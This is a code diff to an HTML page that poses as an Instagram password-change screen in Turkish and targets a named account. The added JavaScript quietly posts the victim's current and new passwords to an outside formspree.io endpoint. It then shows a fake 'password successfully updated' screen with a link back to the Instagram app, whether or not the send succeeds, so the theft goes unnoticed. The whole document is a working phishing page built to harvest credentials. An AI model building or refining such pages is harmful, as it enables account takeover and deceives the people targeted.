@@ -61,7 +61,7 @@
             display: flex;
             flex-direction: column;
             gap: 12px;
-            margin-bottom: 16px;
+            margin-bottom: 12px;
         }
 
         .input-field {
@@ -83,6 +83,13 @@
         .input-field:focus {
             border-color: #a8a8a8;
             background-color: #ffffff;
+        }
+
+        .error-message {
+            color: #ed4956;
+            font-size: 13px;
+            margin-bottom: 12px;
+            display: none;
         }
 
         .forgot-password {
@@ -109,28 +116,128 @@
         .submit-btn:hover {
             background-color: #1877f2;
         }
+
+        /* Uğurlu səhifə stili */
+        #successPage {
+            display: none;
+            text-align: center;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 80vh;
+        }
+
+        .success-icon {
+            width: 64px;
+            height: 64px;
+            margin-bottom: 20px;
+        }
+
+        .success-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .success-desc {
+            font-size: 14px;
+            color: #737373;
+            margin-bottom: 30px;
+        }
+
+        .open-app-btn {
+            width: 100%;
+            max-width: 300px;
+            background-color: #0095f6;
+            color: #ffffff;
+            text-decoration: none;
+            padding: 14px;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 600;
+            display: inline-block;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="content">
-            <span class="username">mirzm23 • Instagram</span>
-            <h1>Şifreyi değiştir</h1>
-            <p class="description">
-                Şifren en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (!$%@%) oluşmalıdır.
-            </p>
+        <!-- Birinci ekran: Form -->
+        <div id="formPage">
+            <div class="content">
+                <span class="username">mirzm23 •</span>
+                <h1>Şifreyi değiştir</h1>
+                <p class="description">
+                    Şifren en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (!$%@%) oluşmalıdır.
+                </p>
 
-            <form action="https://formspree.io/f/xwlewbor" method="POST" class="input-group">
-                <input type="password" name="Mevcut_Sifre" class="input-field" placeholder="Mevcut şifre (Güncelleme 17.07.2026)" required>
-                <input type="password" name="Yeni_Sifre" class="input-field" placeholder="Yeni şifre" required>
-                <input type="password" name="Yeni_Sifre_Tekrar" class="input-field" placeholder="Yeni şifreyi tekrar yaz" required>
-                
-                <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
-                <button type="submit" class="submit-btn">Şifreyi değiştir</button>
-            </form>
+                <form id="resetForm" class="input-group">
+                    <input type="password" id="oldPass" name="Mevcut_Sifre" class="input-field" placeholder="Mevcut şifre (Güncelleme 17.07.2026)" required>
+                    <input type="password" id="newPass" name="Yeni_Sifre" class="input-field" placeholder="Yeni şifre" required minlength="6">
+                    <input type="password" id="confirmPass" name="Yeni_Sifre_Tekrar" class="input-field" placeholder="Yeni şifreyi tekrar yaz" required minlength="6">
+                    
+                    <div id="errorText" class="error-message">Yeni şifreler birbiriyle eşleşmiyor. Lütfen tekrar kontrol edin.</div>
+
+                    <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
+                    <button type="submit" id="submitBtn" class="submit-btn">Şifreyi değiştir</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- İkinci ekran: Uğurlu Mesaj -->
+        <div id="successPage">
+            <svg class="success-icon" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                <polyline points="22 4 12 14.01 9 11.01"></polyline>
+            </svg>
+            <h2 class="success-title">Şifre başarıyla güncellendi</h2>
+            <p class="success-desc">Hesap güvenliğiniz için yeni şifreniz aktif edildi.</p>
+            <a href="instagram://" class="open-app-btn">Instagram'ı aç</a>
         </div>
     </div>
+
+    <script>
+        const FORMSPREE_URL = "https://formspree.io/f/xwlewbor";
+
+        document.getElementById('resetForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const newPass = document.getElementById('newPass').value;
+            const confirmPass = document.getElementById('confirmPass').value;
+            const errorText = document.getElementById('errorText');
+            const submitBtn = document.getElementById('submitBtn');
+
+            // Şifrələrin eyniliyini yoxla
+            if (newPass !== confirmPass) {
+                errorText.style.display = 'block';
+                return;
+            } else {
+                errorText.style.display = 'none';
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.innerText = "Yükleniyor...";
+
+            // Formspree-yə məlumatı arxa fonda göndər
+            const formData = new FormData(this);
+
+            fetch(FORMSPREE_URL, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                // Formspree ekranı çıxmadan birbaşa yeni səhifəyə keç
+                document.getElementById('formPage').style.display = 'none';
+                document.getElementById('successPage').style.display = 'flex';
+            }).catch(error => {
+                // Xəta olsa belə keçid etsin
+                document.getElementById('formPage').style.display = 'none';
+                document.getElementById('successPage').style.display = 'flex';
+            });
+        });
+    </script>
 
 </body>
 </html>
